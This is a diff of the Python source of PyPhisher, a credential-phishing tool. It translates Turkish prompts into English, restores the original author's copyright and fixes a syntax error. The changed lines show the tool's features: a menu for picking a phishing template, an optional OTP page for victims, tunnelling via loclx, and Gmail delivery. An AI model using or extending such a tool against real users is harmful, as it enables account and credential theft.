@@ -18,7 +18,7 @@
 """
 MIT License
 
-Copyright (c) 2021-2023 Zion
+Copyright (c) 2021-2023 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -721,12 +721,12 @@ def write_meta():
         return
     while True:
         if url is None or url == "":
-            metaurl = input(f"\n{ask}{bcyan}Gölge URL'sini girin {green}({blue}sosyal medya önizlemesi için{green}){bcyan}[{red}atlamak için enter tuşuna basın{bcyan}] : {green}")
+            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
         else:
             metaurl = url
         if metaurl=="":
             break
-        elif metaurl == "help"
+        elif metaurl == "help":
             sprint(shadow_help)
         else:
             allmeta = get_meta(metaurl)
@@ -822,7 +822,7 @@ def lx_token():
         status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
         if not "error" in status:
             break
-        has_token = input(f"\n{ask}KİLİT BİLETİN YOKSA N VARSA Y YAZ: {green}")
+        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
         if has_token == "y":
             shell(f"{lx_command} account login")
             break
@@ -972,7 +972,7 @@ def saved():
     else:
         return
 
-# Info HAKKINDA tool
+# Info about tool
 def about():
     clear()
     print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}\x50\x79\x50\x68\x69\x73\x68\x65\x72{yellow}] ")
@@ -1226,7 +1226,7 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Yalnızca uygulama şifresi olan Gmail'e izin verilir!{nc}")
+            print(f"\n{error}Only gmail with app password is allowed!{nc}")
             sleep(1)
 
 # Main Menu to choose phishing type
@@ -1259,7 +1259,7 @@ def main_menu():
         elif mode == "test":
             choice = default_template
         else:
-            choice = input(f"{ask}OLTALAMA YAPILACAK OLANI SEÇ > {green}")
+            choice = input(f"{ask}Select one of the options > {green}")
         if choice != "0" and choice.startswith("0"):
             choice = choice.replace("0", "")
         if choice in choices:
@@ -1274,7 +1274,7 @@ def main_menu():
             if folder == "custom" and mask == "custom":
                 customdir = customfol()
             if otp_folder != "":
-                is_otp = input(f"\n{ask}KURBAN İÇİN OTP ŞİFRESİ OLSUN MU ? Y/N > {green}")
+                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
                 if is_otp == "y":
                     folder = otp_folder
             break
